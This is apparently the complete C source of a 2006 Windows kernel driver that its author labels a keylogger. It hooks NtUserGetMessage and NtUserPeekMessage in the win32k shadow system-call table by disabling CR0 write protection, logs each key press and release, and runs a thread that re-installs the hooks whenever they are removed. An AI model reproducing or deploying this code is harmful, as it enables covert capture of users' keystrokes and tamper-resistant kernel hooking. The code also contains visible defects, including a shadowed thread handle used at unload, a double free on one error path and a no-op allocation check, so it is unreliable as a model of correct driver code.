/********************************************************************
	created:	2006/03/17
	created:	17:3:2006   13:54
	filename: 	C:\SourceSafe\Windows\Hook\TestProjects\Keylogger\kdwin32k\kdwin32k.c
	file path:	C:\SourceSafe\Windows\Hook\TestProjects\Keylogger\kdwin32k
	file base:	kdwin32k
	file ext:	c
	author:		Андрей Груздев
	
	purpose:	кейлоггер - хук на NtUserGet/PeekMessage в shadow service descriptor table(win32k.sys)
*********************************************************************/

#include <ntifs.h>

#include "..\kdprint\kernel\kdprint.h"
#include "..\kdprint\kdctl.h"

#define WM_KEYDOWN                      0x0100
#define WM_KEYUP                        0x0101

#include <pshpack1.h>

// Process I/O Counters
//  NtQueryInformationProcess using ProcessIoCounters
//

// begin_winnt
typedef struct _IO_COUNTERS {
    ULONGLONG  ReadOperationCount;
    ULONGLONG  WriteOperationCount;
    ULONGLONG  OtherOperationCount;
    ULONGLONG ReadTransferCount;
    ULONGLONG WriteTransferCount;
    ULONGLONG OtherTransferCount;
} IO_COUNTERS;
typedef IO_COUNTERS *PIO_COUNTERS;
// end_winnt

//
// Process Virtual Memory Counters
//  NtQueryInformationProcess using ProcessVmCounters
//

typedef struct _VM_COUNTERS {
    SIZE_T PeakVirtualSize;
    SIZE_T VirtualSize;
    ULONG PageFaultCount;
    SIZE_T PeakWorkingSetSize;
    SIZE_T WorkingSetSize;
    SIZE_T QuotaPeakPagedPoolUsage;
    SIZE_T QuotaPagedPoolUsage;
    SIZE_T QuotaPeakNonPagedPoolUsage;
    SIZE_T QuotaNonPagedPoolUsage;
    SIZE_T PagefileUsage;
    SIZE_T PeakPagefileUsage;
} VM_COUNTERS;
typedef VM_COUNTERS *PVM_COUNTERS;

typedef struct _SDT_ENTRY
{
	PVOID *ServiceTableBase;
	PULONG ServiceCounterTableBase; //Used only in checked build
	ULONG NumberOfServices;
	PUCHAR ParamTableBase;
} SDT_ENTRY, *PSDT_ENTRY;

typedef ULONG UINT;
typedef ULONG DWORD;
typedef ULONG BOOL;

typedef HANDLE HWND;
typedef HANDLE HKL;

typedef ULONG WPARAM;
typedef ULONG LPARAM;

typedef struct tagPOINT
{
    LONG  x;
    LONG  y;
} POINT, *PPOINT, *LPPOINT;

/*
 * Message structure
 */
typedef struct tagMSG {
    HWND        hwnd;
    UINT        message;
    WPARAM      wParam;
    LPARAM      lParam;
    DWORD       time;
    POINT       pt;
} MSG, *PMSG, *LPMSG;

typedef enum {
	StateInitialized,
	StateReady,
	StateRunning,
	StateStandby,
	StateTerminated,
	StateWait,
	StateTransition,
	StateUnknown
} THREAD_STATE;

typedef struct _SYSTEM_THREADS {
	LARGE_INTEGER KernelTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER CreateTime;
	ULONG WaitTime;
	PVOID StartAddress;
	CLIENT_ID ClientId;
	KPRIORITY Priority;
	KPRIORITY BasePriority;
	ULONG ContextSwitchCount;
	THREAD_STATE State;
	KWAIT_REASON WaitReason;
} SYSTEM_THREADS, *PSYSTEM_THREADS;

typedef struct _SYSTEM_PROCESSES { // Information Class 5
	ULONG NextEntryDelta;
	ULONG ThreadCount;
	ULONG Reserved1[6];
	LARGE_INTEGER CreateTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER KernelTime;
	UNICODE_STRING ProcessName;
	KPRIORITY BasePriority;
	ULONG ProcessId;
	ULONG InheritedFromProcessId;
	ULONG HandleCount;
	ULONG Reserved2[2];
	VM_COUNTERS VmCounters;
	IO_COUNTERS IoCounters; // Windows 2000 only
	SYSTEM_THREADS Threads[1];
} SYSTEM_PROCESSES, *PSYSTEM_PROCESSES;

#include <poppack.h> 

typedef
struct _SERVICE_HOOK
{
	BOOLEAN		m_bHookSet;
	ULONG		m_ServiceID;
	PVOID		m_pfOrigFunc;
} SERVICE_HOOK, *PSERVICE_HOOK;

typedef
BOOL (NTAPI *f_NtUserGetMessage)(
	IN LPMSG pmsg,
	IN HWND hwnd,
	IN UINT wMsgFilterMin,
	IN UINT wMsgFilterMax);

typedef
BOOL (NTAPI *f_NtUserPeekMessage)(
	OUT LPMSG pmsg,
	IN HWND hwnd,
	IN UINT wMsgFilterMin,
	IN UINT wMsgFilterMax,
	IN UINT wRemoveMsg);

__declspec(dllimport) SDT_ENTRY	KeServiceDescriptorTable;
__declspec(dllimport) VOID NTAPI KeAddSystemServiceTable(PVOID, PVOID, PVOID, PVOID, PVOID);

__declspec(dllimport) USHORT NtBuildNumber;

NTSYSAPI
NTSTATUS
NTAPI
ZwQuerySystemInformation(
	IN ULONG SystemInformationClass,
	IN OUT PVOID SystemInformation,
	IN ULONG SystemInformationLength,
	OUT PULONG ReturnLength OPTIONAL
);

NTSYSAPI
NTSTATUS
NTAPI
ZwOpenProcess(
	OUT PHANDLE ProcessHandle,
	IN ACCESS_MASK DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes,
	IN PCLIENT_ID ClientId OPTIONAL
);

NTSYSAPI
NTSTATUS
NTAPI
ZwOpenThread(
	OUT PHANDLE ThreadHandle,
	IN ACCESS_MASK DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes,
	IN PCLIENT_ID ClientId
);

PSDT_ENTRY g_pKeServiceDescriptorTableShadow = NULL;

SERVICE_HOOK	g_HookNtUserGetMessage = {FALSE, 0, NULL},
				g_HookNtUserPeekMessage = {FALSE, 0, NULL};

volatile LONG gSysEnters = 0;
PBOOLEAN g_pThreadsLocked = NULL;
volatile BOOLEAN g_bUnload = FALSE;
HANDLE hPatchCheckThread = NULL;

//+ ---------------------------------------------------------------------------------------
VOID MarkThread()
{
	g_pThreadsLocked[(ULONG)PsGetCurrentThreadId() & 0xFFFF] = TRUE;
}

VOID UnMarkThread()
{
	g_pThreadsLocked[(ULONG)PsGetCurrentThreadId() & 0xFFFF] = FALSE;
}
//+ перехватчики ------------------------------------------------------------------------------
BOOL NTAPI Hook_NtUserGetMessage(
	OUT LPMSG pmsg,
	IN HWND hwnd,
	IN UINT wMsgFilterMin,
	IN UINT wMsgFilterMax)
{
	BOOL bReturn;

	InterlockedIncrement((PLONG)&gSysEnters);
	MarkThread();

	bReturn = ((f_NtUserGetMessage)g_HookNtUserGetMessage.m_pfOrigFunc)(pmsg, hwnd,
		wMsgFilterMin, wMsgFilterMax);

	if (bReturn)
	{
		switch (pmsg->message)
		{
		case WM_KEYDOWN:
			KDPrint("kdwin32k.sys: NtUserGetMessage,  key pressed VK_CODE:%d\n", pmsg->wParam);
			break;
		case WM_KEYUP:
			KDPrint("kdwin32k.sys: NtUserGetMessage,  key released VK_CODE:%d\n", pmsg->wParam);
			break;
		}
	}

	UnMarkThread();
	InterlockedDecrement((PLONG)&gSysEnters);

	return bReturn;
}

BOOL NTAPI Hook_NtUserPeekMessage(
	OUT LPMSG pmsg,
	IN HWND hwnd,
	IN UINT wMsgFilterMin,
	IN UINT wMsgFilterMax,
	IN UINT wRemoveMsg)
{
	BOOL bReturn;

	InterlockedIncrement((PLONG)&gSysEnters);
	MarkThread();

	bReturn = ((f_NtUserPeekMessage)g_HookNtUserPeekMessage.m_pfOrigFunc)(pmsg, hwnd,
		wMsgFilterMin, wMsgFilterMax, wRemoveMsg);

	if (bReturn)
	{
		switch (pmsg->message)
		{
		case WM_KEYDOWN:
			KDPrint("kdwin32k.sys: NtUserPeekMessage,  key pressed VK_CODE:%d, Remove:%d\n",
				pmsg->wParam, wRemoveMsg);
			break;
		case WM_KEYUP:
			KDPrint("kdwin32k.sys: NtUserPeekMessage,  key released VK_CODE:%d, Remove:%d\n", pmsg->wParam,
				wRemoveMsg);
			break;
		}
	}

	UnMarkThread();
	InterlockedDecrement((PLONG)&gSysEnters);

	return bReturn;
}
//- перехватчики ------------------------------------------------------------------------------

// получаем адрес KeServiceDescriptorTableShadow
PVOID GetAddrOfShadowTable()
{
	PUCHAR FuncPtr = (PUCHAR)KeAddSystemServiceTable;
	ULONG i;

	for( i = 0; i < 4096; i++, FuncPtr++)
	{
		PUCHAR PUCHARAtFuncPtr;

// сканируем код ф-и KeAddSystemServiceTable в поисках указателя на shadowtable
		__try
		{
			PUCHARAtFuncPtr = *(PUCHAR *)FuncPtr;
		}
		__except (EXCEPTION_EXECUTE_HANDLER)
		{
			return NULL;
		}

		if(MmIsAddressValid(PUCHARAtFuncPtr) && MmIsAddressValid(PUCHARAtFuncPtr+sizeof(SDT_ENTRY)-1))
		{
            __try
            {
// у shadowtable совпадает с SDT первый элемент
			    if(memcmp(PUCHARAtFuncPtr, &KeServiceDescriptorTable, sizeof(SDT_ENTRY)) == 0)
			    {
// пропускаем указатель на SDT
					if(PUCHARAtFuncPtr == (PUCHAR)&KeServiceDescriptorTable)
						continue;

				    return PUCHARAtFuncPtr;
			    }

            }

            __except(EXCEPTION_EXECUTE_HANDLER)
			{
			}
		}
	}

	return NULL;
}

// установка бита WP в cr0 в заданное значение
// возвращает предыдущее значение бита
__declspec(naked) ULONG __stdcall SetWPBit(IN ULONG Set)
{
	__asm
	{
		push	ebp
		mov		ebp, esp

		push	ebx
		push	edx

		mov		ebx, cr0
		mov		eax, ebx

		mov		edx, Set
		and		edx, 1
		shl		edx, 16

		and		ebx, ~0x10000
		or		ebx, edx
		mov		cr0, ebx

		and		eax, 10000h
		shr		eax, 16

		pop		edx
		pop		ebx
		
		pop		ebp

		ret		4
	}
}

// перехват сервиса ntoskrnl/win32k по ServiceID
BOOLEAN HookNtFuncByID(IN ULONG NativeID, IN PVOID HookFunc, OUT PVOID *pfServiceFunc OPTIONAL)
{
// если syscall к ntoskrnl.exe
	if (!(NativeID & 0x3000))
	{
		ULONG WPBit;

		if (pfServiceFunc)
			*pfServiceFunc = KeServiceDescriptorTable.ServiceTableBase[NativeID];

		if (HookFunc)
		{
			WPBit = SetWPBit(0);
			KeServiceDescriptorTable.ServiceTableBase[NativeID] = HookFunc;
			SetWPBit(WPBit);
		}

		return TRUE;
	}
// иначе к win32k.sys
	else
	{
		if (g_pKeServiceDescriptorTableShadow)
		{
			PSDT_ENTRY pWIN32KServiceDescriptorTable;
			ULONG WIN32K_ServiceID;
			PVOID *pfService;

// таблица win32k.sys с индексом 1
			pWIN32KServiceDescriptorTable = g_pKeServiceDescriptorTableShadow+1;
			WIN32K_ServiceID = NativeID & 0x0FFF;

			pfService = (PVOID *)(pWIN32KServiceDescriptorTable->ServiceTableBase + WIN32K_ServiceID);
			if (pWIN32KServiceDescriptorTable->ServiceTableBase && MmIsAddressValid(pfService))
			{
				ULONG WPBit;
				
				if (pfServiceFunc)
					*pfServiceFunc = *pfService;

				if (HookFunc)
				{
					WPBit = SetWPBit(0);
					*pfService = HookFunc;
					SetWPBit(WPBit);
				}

				return TRUE;
			}
		}
	}

	return FALSE;
}
//-------------------------------------------------------------------------------------------------
// аттачимся к CSRSS, чтобы иметь в АП таблицу сервисов win32k
PKAPC_STATE AttachToCSRSS()
{
	ULONG BufferSize = sizeof(SYSTEM_THREADS)*1000;
	PVOID pBuffer = NULL;
	NTSTATUS ntStatus;
	PSYSTEM_PROCESSES pSysProc;
	UNICODE_STRING CsrssStr;
	PKAPC_STATE pAPCState = NULL;
	ULONG Tmp;

	RtlInitUnicodeString(&CsrssStr, L"csrss.exe");

// получаем список процессов
	do
	{
		if (pBuffer)
			ExFreePool(pBuffer);

		pBuffer = ExAllocatePoolWithTag(PagedPool, BufferSize, '0000');
		if (!pBuffer)
			NULL;

		ntStatus = ZwQuerySystemInformation(5/*processes and threads*/, pBuffer,
			BufferSize, &Tmp);
		if (ntStatus != STATUS_SUCCESS && ntStatus != STATUS_INFO_LENGTH_MISMATCH)
			break;

		BufferSize *= 2;
	} while(ntStatus != STATUS_SUCCESS && BufferSize < 1000000);

	if (ntStatus == STATUS_SUCCESS)
	{
		pSysProc = (PSYSTEM_PROCESSES)pBuffer;
		do
		{
// если это CSRSS
			if (RtlCompareUnicodeString(&pSysProc->ProcessName, &CsrssStr, TRUE) == 0)
			{
				HANDLE hProcess;
				CLIENT_ID Cid;
				OBJECT_ATTRIBUTES ProcOA;

				InitializeObjectAttributes(&ProcOA, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);

				Cid.UniqueProcess = (HANDLE)pSysProc->ProcessId;
				Cid.UniqueThread = 0;
// открываем процесс, чтобы получить его объект
				ntStatus = ZwOpenProcess(&hProcess, 0, &ProcOA, &Cid);
				if (ntStatus == STATUS_SUCCESS)
				{
					PKPROCESS pProcess;

					ntStatus = ObReferenceObjectByHandle(hProcess, 0, NULL, KernelMode, &pProcess, NULL);
					if (ntStatus == STATUS_SUCCESS)
					{
						pAPCState = ExAllocatePoolWithTag(NonPagedPool, sizeof(KAPC_STATE), '0000');
// аттачимся..
						if (pAPCState)
							KeStackAttachProcess(pProcess, pAPCState);

						ObDereferenceObject(pProcess);
					}
// считаем, что у нас kernelhandle и закроем мы его здесь
					ZwClose(hProcess);
				}
			}

			(PCHAR)pSysProc += pSysProc->NextEntryDelta;
		} while (pSysProc->NextEntryDelta && !pAPCState);
	}

	ExFreePool(pBuffer);

	return pAPCState;
}

BOOLEAN SetHooks()
{
	PKAPC_STATE pAPCState;

	g_pKeServiceDescriptorTableShadow = GetAddrOfShadowTable();
	if (!g_pKeServiceDescriptorTableShadow)
	{
		KDPrint("kdwin32k.sys: failed to locate KeServiceDescriptorTableShadow\n");
		return FALSE;
	}

	if (NtBuildNumber < 2195)
	{
		KDPrint("kdwin32k.sys: Win2K+ only supported\n");
		return FALSE;
	}

// win xp +
	if (NtBuildNumber >= 2600)
	{
		if (NtBuildNumber >= 3790)
		{
// win 2003 srv
			g_HookNtUserGetMessage.m_ServiceID = 0x11A4;
			g_HookNtUserPeekMessage.m_ServiceID = 0x11D9;			
		}
		else
		{
// win xp
			g_HookNtUserGetMessage.m_ServiceID = 0x11A5;
			g_HookNtUserPeekMessage.m_ServiceID = 0x11DA;
		}
	}
	else
	{
// win 2k
			g_HookNtUserGetMessage.m_ServiceID = 0x119A;
			g_HookNtUserPeekMessage.m_ServiceID = 0x11CA;
	}

// аттачимся к АП CSRSS, чтобы иметь отмаппированную в АП shadowtable
	pAPCState = AttachToCSRSS();	
	if (!pAPCState)
	{
		KDPrint("kdwin32k.sys: failed to attach to CSRSS.EXE\n");
		return FALSE;
	}

	if (!g_HookNtUserGetMessage.m_bHookSet)
	{
		g_HookNtUserGetMessage.m_bHookSet = HookNtFuncByID(g_HookNtUserGetMessage.m_ServiceID,
			Hook_NtUserGetMessage, &g_HookNtUserGetMessage.m_pfOrigFunc);
		if (!g_HookNtUserGetMessage.m_bHookSet)
			KDPrint("kdwin32k.sys: failed to hook NtUserGetMessage\n");
	}

	if (!g_HookNtUserPeekMessage.m_bHookSet)
	{
		g_HookNtUserPeekMessage.m_bHookSet = HookNtFuncByID(g_HookNtUserPeekMessage.m_ServiceID,
			Hook_NtUserPeekMessage, &g_HookNtUserPeekMessage.m_pfOrigFunc);
		if (!g_HookNtUserPeekMessage.m_bHookSet)
			KDPrint("kdwin32k.sys: failed to hook NtUserPeekMessage\n");
	}

// отсоединяемся..
	KeUnstackDetachProcess(pAPCState);
	ExFreePool(pAPCState);

	return g_HookNtUserGetMessage.m_bHookSet && g_HookNtUserPeekMessage.m_bHookSet;
}

// снимаем хуки
BOOLEAN RemoveHooks()
{
	PKAPC_STATE pAPCState;

	g_bUnload = TRUE;
	ZwWaitForSingleObject(hPatchCheckThread, FALSE, NULL);
	ZwClose(hPatchCheckThread);

	pAPCState = AttachToCSRSS();	
	if (!pAPCState)
	{
		KDPrint("kdwin32k.sys: failed to attach to CSRSS.EXE\n");
		return FALSE;
	}

	if (g_HookNtUserGetMessage.m_bHookSet)
	{
		HookNtFuncByID(g_HookNtUserGetMessage.m_ServiceID, g_HookNtUserGetMessage.m_pfOrigFunc,
			NULL);
	}

	if (g_HookNtUserPeekMessage.m_bHookSet)
	{
		HookNtFuncByID(g_HookNtUserPeekMessage.m_ServiceID, g_HookNtUserPeekMessage.m_pfOrigFunc,
			NULL);
	}

	KeUnstackDetachProcess(pAPCState);
	ExFreePool(pAPCState);
	
	return TRUE;
}

VOID CheckPatch()
{
	PKAPC_STATE pAPCState;

	pAPCState = AttachToCSRSS();
	if (pAPCState)
	{
		if (g_HookNtUserGetMessage.m_bHookSet)
		{
			PVOID p_fServiceFunc;

			if (HookNtFuncByID(g_HookNtUserGetMessage.m_ServiceID, NULL, &p_fServiceFunc))
			{
				if (p_fServiceFunc != Hook_NtUserGetMessage)
				{
					KDPrint("kdwin32k.sys: somebody removed hook from NtUserGetMessage, repatching..\n");
					if (HookNtFuncByID(g_HookNtUserGetMessage.m_ServiceID, Hook_NtUserGetMessage, NULL))
						KDPrint("kdwin32k.sys: repatched NtUserGetMessage..\n");
				}
				else
					KDPrint("kdwin32k.sys: hook still set on NtUserGetMessage\n");
			}
		}

		if (g_HookNtUserPeekMessage.m_bHookSet)
		{
			PVOID p_fServiceFunc;

			if (HookNtFuncByID(g_HookNtUserPeekMessage.m_ServiceID, NULL, &p_fServiceFunc))
			{
				if (p_fServiceFunc != Hook_NtUserPeekMessage)
				{
					KDPrint("kdwin32k.sys: somebody removed hook from NtUserPeekMessage, repatching..\n");
					if (HookNtFuncByID(g_HookNtUserPeekMessage.m_ServiceID, Hook_NtUserPeekMessage, NULL))
						KDPrint("kdwin32k.sys: repatched NtUserPeekMessage..\n");
				}
				else
					KDPrint("kdwin32k.sys: hook still set on NtUserPeekMessage\n");
			}
		}

		KeUnstackDetachProcess(pAPCState);
		ExFreePool(pAPCState);
	}
}

VOID NTAPI PatchCheckThread(IN PVOID Context)
{
	LARGE_INTEGER ExpireTime;

	ExpireTime.QuadPart = -2000000L;	// 200 msecs
	while (!g_bUnload)
	{
		CheckPatch();
		KeDelayExecutionThread(KernelMode, FALSE, &ExpireTime);
	}

	PsTerminateSystemThread(STATUS_SUCCESS);
}

static PDEVICE_OBJECT g_pControlDeviceObject = NULL;

BOOLEAN CheckThreadPresent(IN HANDLE Cid)
{
	NTSTATUS ntStatus;
	HANDLE hThread;
	OBJECT_ATTRIBUTES ThreadOA;
	CLIENT_ID _Cid;

	InitializeObjectAttributes(&ThreadOA, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
	_Cid.UniqueProcess = NULL;
	_Cid.UniqueThread = Cid;
	ntStatus = ZwOpenThread(&hThread, 0, &ThreadOA, &_Cid);
	if (NT_SUCCESS(ntStatus))
	{
		ZwClose(hThread);
		return TRUE;
	}

	return FALSE;
}

VOID NTAPI KDUnload(IN PDRIVER_OBJECT DriverObject)
{
	LARGE_INTEGER ExpireTime;
	UNICODE_STRING cntdSymlinkName;

	RemoveHooks();

// ждем выхода из перехватчиков..
	ExpireTime.QuadPart = -10000000L;	// 1000 msecs
	while (gSysEnters)
	{
		ULONG i;

		KDPrint("\n");
		for (i = 0; i < 0x10000; i++)
		{
			if (g_pThreadsLocked[i])
			{
// если нитка ушла, не выйдя из GetMessage/PeekMessage...
				if (!CheckThreadPresent((HANDLE)i))
				{
					InterlockedDecrement((PLONG)&gSysEnters);
					g_pThreadsLocked[i] = FALSE;
					continue;
				}

				KDPrint("kdwin32k.sys: thread Cid:%d is locked on GetMessage/PeekMessage\n", i);
			}
		}

		KeDelayExecutionThread(KernelMode, FALSE, &ExpireTime);
	}

	ExFreePool(g_pThreadsLocked);

	RtlInitUnicodeString(&cntdSymlinkName, K_CONTROL_SYMLINK_NAME(KDWIN32K));
	IoDeleteSymbolicLink(&cntdSymlinkName);
	IoDeleteDevice(g_pControlDeviceObject);

	KDPrintUnInit();

	KDPrint("kdwin32k.sys: unloaded..\n");
}

NTSTATUS NTAPI KDControlDispatch(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
{
	NTSTATUS ntStatus = STATUS_INVALID_DEVICE_REQUEST;
	PIO_STACK_LOCATION IrpSp = IoGetCurrentIrpStackLocation(Irp);


	if (IrpSp->DeviceObject == g_pControlDeviceObject)
	{
		switch (IrpSp->MajorFunction)
		{
		case IRP_MJ_CREATE:
		case IRP_MJ_CLOSE:
			ntStatus = STATUS_SUCCESS;
			break;
		case IRP_MJ_DEVICE_CONTROL:
			if (IrpSp->Parameters.DeviceIoControl.IoControlCode != IOCTL_INIT_KDPRINT)
				break;

			if (IrpSp->Parameters.DeviceIoControl.InputBufferLength >= sizeof(KDPRINT_INIT_INPARAM))
			{
				ntStatus = KDPrintInit(	((PKDPRINT_INIT_INPARAM)Irp->AssociatedIrp.SystemBuffer)->m_hSectionMutant,
										((PKDPRINT_INIT_INPARAM)Irp->AssociatedIrp.SystemBuffer)->m_hSection);
			}
		}
	}

	Irp->IoStatus.Information = 0;
	Irp->IoStatus.Status = ntStatus;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);

	return ntStatus;
}

NTSTATUS NTAPI DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING RegistryPath)
{
	OBJECT_ATTRIBUTES ThreadOA;
	NTSTATUS ntStatus;
	HANDLE hPatchCheckThread;
	UNICODE_STRING cntdControlDeviceName;
	UNICODE_STRING cntdControlSymlinkName;

	DriverObject->DriverUnload = KDUnload;
	DriverObject->MajorFunction[IRP_MJ_CREATE] = KDControlDispatch;
	DriverObject->MajorFunction[IRP_MJ_CLOSE] = KDControlDispatch;
	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = KDControlDispatch;

	RtlInitUnicodeString(&cntdControlDeviceName, K_CONTROL_DEVICE_NAME(KDWIN32K));
	ntStatus = IoCreateDevice(DriverObject, 0, &cntdControlDeviceName, FILE_DEVICE_UNKNOWN, 0, FALSE,
		&g_pControlDeviceObject);
	if (!NT_SUCCESS(ntStatus))
		return ntStatus;

	g_pControlDeviceObject->Flags |= DO_BUFFERED_IO;
	
	RtlInitUnicodeString(&cntdControlSymlinkName, K_CONTROL_SYMLINK_NAME(KDWIN32K));
	ntStatus = IoCreateSymbolicLink(&cntdControlSymlinkName, &cntdControlDeviceName);
	if (!NT_SUCCESS(ntStatus))
	{
		IoDeleteDevice(g_pControlDeviceObject);
		return ntStatus;
	}

	g_pThreadsLocked = (PBOOLEAN)ExAllocatePoolWithTag(PagedPool, 0x10000, '0000');
	if (!g_pThreadsLocked)
	{
		KDPrint("kdwin32k.sys: failed to allocate buffer..\n");

		IoDeleteSymbolicLink(&cntdControlSymlinkName);
		IoDeleteDevice(g_pControlDeviceObject);

		return STATUS_UNSUCCESSFUL;
	}
	RtlZeroMemory(g_pThreadsLocked, 0x10000);

	if (!SetHooks())
	{
		KDPrint("kdwin32k.sys: failed to set hooks\n");

		ExFreePool(g_pThreadsLocked);

		IoDeleteSymbolicLink(&cntdControlSymlinkName);
		IoDeleteDevice(g_pControlDeviceObject);
		return STATUS_UNSUCCESSFUL;
	}

	InitializeObjectAttributes(&ThreadOA, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
	ntStatus = PsCreateSystemThread(&hPatchCheckThread, 0, &ThreadOA, NULL, NULL, PatchCheckThread, NULL);
	if (ntStatus != STATUS_SUCCESS)
	{
		RemoveHooks();
		ExFreePool(g_pThreadsLocked);

		ExFreePool(g_pThreadsLocked);

		IoDeleteSymbolicLink(&cntdControlSymlinkName);
		IoDeleteDevice(g_pControlDeviceObject);

		KDPrint("kdwin32k.sys: failed to create thread\n");
		return STATUS_UNSUCCESSFUL;
	}

	KDPrint("kdwin32k.sys: loaded..\n");

	return STATUS_SUCCESS;
}
